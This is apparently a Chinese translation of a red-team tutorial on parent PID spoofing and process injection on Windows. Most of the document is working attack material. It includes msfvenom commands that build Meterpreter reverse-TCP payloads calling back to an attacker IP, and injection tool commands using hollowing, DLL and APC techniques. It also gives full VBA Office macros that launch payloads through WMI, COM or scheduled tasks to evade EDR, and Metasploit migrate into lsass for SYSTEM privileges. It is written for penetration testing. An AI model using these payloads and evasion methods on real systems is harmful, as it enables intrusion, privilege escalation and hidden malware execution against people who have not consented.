进程"pentestlab.exe"将作为"lsass.exe"的子进程在目标主机上创建:  
之后将返回一个Meterpreter会话，且为SYSTEM权限：  
这里的"getsystem"是基于c#的，这使得它能够通过Covenant或任何其他可以加载汇编二进制文件的相关框架(CS)来实现这项技术:
    Assembly GetSystem.exe "pentestlab.exe lsass"
类似于Metasploit框架的"migrate"命令，可以执行Assembly二进制文件，之后将进程从管理员提升到系统  
对可用"Grunts"列表的调查将显示，与初始进程相比，新代理以系统级权限运行  
父进程可以是"lsass"或以系统级权限运行的任何其他进程  
Chirag Savla使用c#开发了一个工具，通过利用所有常见的windows API(create
process、virtualallocex、openprocess等)来执行进程注入，并能够执行父pid欺骗)，该工具的好处是支持带有父PID欺骗的不同进程注入技术，该工具接受base-64、c和hex中的shelllcode，我们可以使用Msfvenom来生成这些格式的shellcode：
    msfvenom -p windows/x64/meterpreter/reverse_tcp exitfunc=thread LHOST=10.0.0.13 LPORT=4444 -f hex > pentestlab.txt
该工具需要注入进程的路径、shellcode的路径、父进程名、有效负载的文件格式和进程注入技术，执行下面的命令将把shellcode注入一个新的进程(calc.exe
)并使用explorer.exe作为父进程
    ProcessInjection.exe /ppath:"C:\Windows\System32\calc.exe" /path:"pentestlab.txt" /parentproc:explorer /f:hex /t:4
从Porcess Monitor可以看到calc.exe是在explorer.exe环境下创建的  
shellcode将在calc.exe的虚拟地址空间中执行，并且将与MSF建立通信  
ProcessInjection还支持通过dll注入进行父PID欺骗，可以用msfvenom来生成任意的dll文件
    msfvenom -p windows/x64/meterpreter/reverse_tcp exitfunc=thread LHOST=10.0.0.13 LPORT=4444 -f dll > pentestlab.dll
在使用时需要指定dll的路径，而不是ShellCode，并且技术值应该更改为5：
    ProcessInjection.exe /ppath:"C:\Windows\System32\calc.exe" /path:"pentestlab.dll" /parentproc:explorer /t:5
当在进程内部创建远程线程时，将执行shell代码并打开一个Meterpreter会话  
该Session将在"rundll32"进程的上下文下运行  
指定技术6将使用进程空洞化技术执行父进程欺骗
    ProcessInjection.exe /ppath:"C:\Windows\System32\calc.exe" /path:"pentestlab.txt" /parentproc:explorer /f:hex /t:6
该工具还支持带有异步过程调用的进程注入，对于更隐蔽的方法shellcode的执行将发生在目标进程的主线程的入口点之前
    ProcessInjection.exe /ppath:"C:\Windows\System32\calc.exe" /path:"pentestlab.txt" /parentproc:explorer /f:hex /t:8
一个名为[Remote ProcessInjection](https://github.com/Mr-Un1k0d3r/RemoteProcessInjection "Remote
ProcessInjection")的c#实用程序也能够执行进程注入，该工具是为Cobalt
Strike设计的，并接受base-64的有效载荷，Msfvenom可以生成原始的ShellCode，之后将该Shell Code转换为base-64：
    msfvenom -p windows/x64/meterpreter/reverse_tcp -f raw -o payload64.bin LHOST=10.0.0.13 LPORT=4444
    base64 -i /root/payload64.bin > payload64.txt
ShellCode将被注入到目标进程中，尽管它没有利用"CreateProcess"API来欺骗父进程，但它提供了在合法的WIndows进程中隐藏恶意软件的能力：
    RemoteInject64.exe 4272 
有效负载将从目标进程的内存地址空间执行，进程注入方法与Metasploit的"migrate" 命令相似，都使用相同的Windows API  
## VBA
Microsoft
Office一直是非常受欢迎的恶意软件中间应用，因为它帮助红队在目标内部环境获得最初的立足点，然而以宏的形式执行恶意代码将会创建任意的子进程，这很容易被具有分析进程的父和子关系之间的异常的能力的EDR发现。  
有多种方法可用于逃避对提供父/子关系检测的EDR产品，例如，VBScript可以调用其他系统资源来执行恶意软件，如WMI、COM或计划任务，父进程可以不是Windows
Word，而是Windows操作系统的进程，以下宏将使用wmi(Windows Management Instrumentation)来创建新进程
    Sub Parent()
    Set objWMIService = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
    Set objStartup = objWMIService.Get("Win32_ProcessStartup")
    Set objConfig = objStartup.SpawnInstance_
    Set objProcess = GetObject("winmgmts:root\cimv2:Win32_Process")
    errReturn = objProcess.Create("C:\Temp\pentestlab.exe", Null, objConfig, intProcessID)
    End Sub
这种方法的好处是创建的进程将在"WmiPrvSE.exe"下生成，而不是Office进程  
之后将会返回一个Meterpreter会话：  
COM对象也可以用来执行新的进程：
    Sub Parent()
    Set obj = GetObject("new:C08AFD90-F2A1-11D1-8455-00A0C91F3880")
    obj.Document.Application.ShellExecute "pentestlab.exe",Null,"C:\Temp\",Null,0
    End Sub
使用此方法执行恶意文件的结果是，父进程将是"explorer.exe"，即使程序的执行在office应用内部进行：  
下图为通过执行任意有效负载的COM对象后返回的一个Meterpreter会话：  
计划任务经常被用作一种持久性方法，因为它允许红队在特定的日期或时间执行他们的事务，它也可以用于父PID欺骗，因为调度任务可以直接从VBScript创建，下面的代码注册了一个新的调度任务，该任务将在30秒后触发有效负载的执行
    Sub Parent()
    Set service = CreateObject("Schedule.Service")
    Call service.Connect
    Dim td: Set td = service.NewTask(0)
    td.RegistrationInfo.Author = "Pentest Laboratories"
    td.settings.StartWhenAvailable = True
    td.settings.Hidden = False
    Dim triggers: Set triggers = td.triggers
    Dim trigger: Set trigger = triggers.Create(1)
    Dim startTime: ts = DateAdd("s", 30, Now)
    startTime = Year(ts) & "-" & Right(Month(ts), 2) & "-" & Right(Day(ts), 2) & "T" & Right(Hour(ts), 2) & ":" & Right(Minute(ts), 2) & ":" & Right(Second(ts), 2)
    trigger.StartBoundary = startTime
    trigger.ID = "TimeTriggerId"
    Dim Action: Set Action = td.Actions.Create(0)
    Action.Path = "C:\Users\pentestlab.exe"
    Call service.GetFolder("\").RegisterTaskDefinition("PentestLab", td, 6, , , 3)
    End Sub
新的进程将不再以微软产品的流程为父进程，而是以"svchost.exe"作为更隐蔽的方法：  
查看进程属性可以看到父进程是"svhcost.exe"  
## Metasploit
Metasploit框架包含一个后渗透测试模块，可用于将现有的Meterpreter会话迁移到系统上的另一个进程，该模块将遵循与本文中描述的其他工具相同的功能，以便将现有的shell代码重写到另一个进程的地址空间中，具体而言该模块将遵循以下流程:
  * 获取目标进程的PID
  * 检查目标进程的体系结构(32位或64位)
  * 检查meterpreter会话是否具有SeDebugPrivilege
  * 从现有进程中检索负载
  * 调用OpenProcess() API以获得对目标进程虚拟内存的访问
  * 调用VirtualAllocEx() API以在目标进程中分配rwx内存
  * 调用WriteProcessMemory() API以将负载写入进程的虚拟内存空间
  * 调用CreateRemoteThread() API以在目标进程的虚拟内存空间中创建一个线程
  * 关闭上一个线程
使用PID和目标进程的名称来定义现有会话
    use post/windows/manage/migrate
    set SESSION 1
    set PID 508
    set NAME lsass.exe
    set KILL true
执行结果如下所示：  
类似地，Meterpreter还包含"migrate"命令，该命令可以将现有会话迁移到另一个进程  
## Toolkit
本文涉及到的工具如下所示：
  * SelectMyParent(C++):
  * ppid-spoofing(PowerShell):
  * GetSystem(C#):
  * GetSystem-Offline(C++):
  * APC-PPID(C++)：
  * psgetsystem(PowerShell)：
  * PPID-Spoofing(C++)：
  * ProcessInjection(C#)：
  * RemoteProcessInjection(C#)：
  * Spoofing-Office-Macro(VBA)：
## 参考链接
[阅读原文](https://pentestlab.blog/2020/02/24/parent-pid-spoofing/ "阅读原文")